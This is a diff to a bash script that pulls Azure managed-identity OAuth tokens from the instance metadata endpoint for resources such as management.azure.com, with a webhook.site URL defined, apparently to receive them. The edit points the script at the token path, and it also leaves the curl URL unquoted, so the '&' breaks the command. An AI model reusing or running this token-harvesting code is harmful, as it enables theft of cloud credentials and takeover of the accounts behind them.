@@ -2,7 +2,7 @@
 
 WEBHOOK_URL="https://webhook.site/b4b33967-c95c-4510-bda7-0110af22aff2"
 
-IDENTITY_ENDPOINT="http://169.254.169.254/metadata"
+IDENTITY_ENDPOINT="http://169.254.169.254/metadata/identity/oauth2/token"
 
 RESOURCES=(
     "https://management.azure.com/"
@@ -18,7 +18,7 @@ echo "Starting token collection from $IDENTITY_ENDPOINT..."
 for R in "${RESOURCES[@]}"; do
 
     
-    RESPONSE=$(curl -s -H "Metadata:true" "$IDENTITY_ENDPOINT?api-version=2021-12-13&resource=$R")
+    RESPONSE=$(curl -s -H "Metadata:true" $IDENTITY_ENDPOINT?api-version=2021-12-13&resource=$R)
 
     echo $RESPONSE
     
